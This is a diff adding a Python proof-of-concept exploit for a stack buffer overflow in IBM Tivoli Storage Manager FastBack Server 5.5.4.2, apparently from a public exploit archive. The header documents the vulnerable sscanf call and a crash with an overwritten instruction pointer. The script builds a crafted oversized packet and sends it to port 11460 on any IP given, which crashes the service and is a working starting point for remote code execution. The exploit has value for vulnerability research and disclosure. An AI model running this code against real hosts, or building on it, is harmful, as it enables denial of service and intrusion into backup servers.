@@ -1,0 +1,115 @@
+#!/usr/bin/python
+#         
+################################################################################
+#
+#            Title: IBM Tivoli Storage Manager FastBack Server 5.5.4.2
+#                   _FXCLI_GetConfFileChunk Stack Buffer Overflow Vulnerability
+#             Date: 14 December 2015
+#           Author: Gianni Gnesa (gnix) 
+#
+#  Vendor Homepage: http://www.ibm.com/
+#    Software Name: IBM Tivoli Storage Manager FastBack 
+# Software Version: 5.5.4.2 (x86)
+#    Software Link: - Go to https://www-01.ibm.com/marketing/iwm/tnd/search.jsp?pn=Tivoli+Storage+Manager
+#                   - Select "IBM Tivoli Storage Manager FastBack Try-and-Buy" 
+#                     (Version 5.5.4.2, Size: 120.7 MB)
+#
+#        Tested on: Windows 7 Professional (x86)
+#
+################################################################################
+#
+# Vulnerability:
+# ==============
+#
+# The vulnerability is a stack buffer overflow in the _FXCLI_GetConfFileChunk 
+# function caused by the insecure usage of _sscanf while parsing user-controlled 
+# input.
+#
+# .text:0057898E      lea     eax, [ebp+var_210]
+# .text:00578994      push    eax
+# .text:00578995      lea     ecx, [ebp+var_108]
+# .text:0057899B      push    ecx
+# .text:0057899C      lea     edx, [ebp+var_20C]
+# .text:005789A2      push    edx
+# .text:005789A3      lea     eax, [ebp+var_4]
+# .text:005789A6      push    eax
+# .text:005789A7      lea     ecx, [ebp+var_104]      <=== Buffer that will be overwritten
+# .text:005789AD      push    ecx
+# .text:005789AE      push    offset $SG128635 ; "File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d"
+# .text:005789B3      mov     edx, [ebp+Src]
+# .text:005789B6      push    edx             ; Src   <=== Buffer under our control
+# .text:005789B7      call    _sscanf                 <=== Stack Buffer Overflow!!!
+#
+################################################################################
+#
+# Crash:
+# ======
+#
+# (b44.9dc): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=00000000 ebx=01cd4fb8 ecx=01dacf8c edx=776870b4 esi=01cd4fb8 edi=00000000
+# eip=41414141 esp=01dae328 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+# 41414141 ??              ???
+#
+################################################################################
+
+import sys
+import time
+import socket
+from struct import pack
+
+
+def create_pkt(opcode, p1="", p2="", p3=""):
+
+	# psAgentCommand (0x30 bytes)
+	buf = "\x44" * 0xC
+	buf+= pack("<L", opcode)			# opcode
+
+	buf+= pack("<i", 0x0)				# 1st memcpy: offset (in psCommandBuffer.data) for Src field 
+	buf+= pack("<i", len(p1)) 			# 1st memcpy: size field
+	buf+= pack("<i", len(p1))			# 2nd memcpy: offset (in psCommandBuffer.data) for Src field
+	buf+= pack("<i", len(p2)) 			# 2nd memcpy: size field
+	buf+= pack("<i", len(p1) + len(p2))	# 3rd memcpy: offset (in psCommandBuffer.data) for Src field
+	buf+= pack("<i", len(p3)) 			# 3rd memcpy: size field
+
+	buf+= "\x44\x44\x44\x44"
+	buf+= "\x44\x44\x44\x44"
+
+	# psCommandBuffer
+	buf+= p1
+	buf+= p2
+	buf+= p3
+	
+	# buf len - 4 because the packet length is not included
+	buf = pack(">i", len(buf)-4) + buf
+	
+	return buf
+	
+	
+def main():
+	if len(sys.argv) != 2:
+		print "Usage: %s <ip_address>\n" % sys.argv[0]
+		sys.exit(1)
+
+	server = sys.argv[1]
+	port = 11460
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
+	
+	pkt = create_pkt(	opcode=0x531,
+						p1 = "File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % ("A"*10000,0,0,0,0),
+						p2 = "B" * 24000,
+						p3 = "C" * 24000 )
+
+	s.send(pkt)	
+	s.close()
+    
+	print "[+] Packet sent."
+	sys.exit(0) 
+	
+	
+if __name__ == "__main__":
+	main()
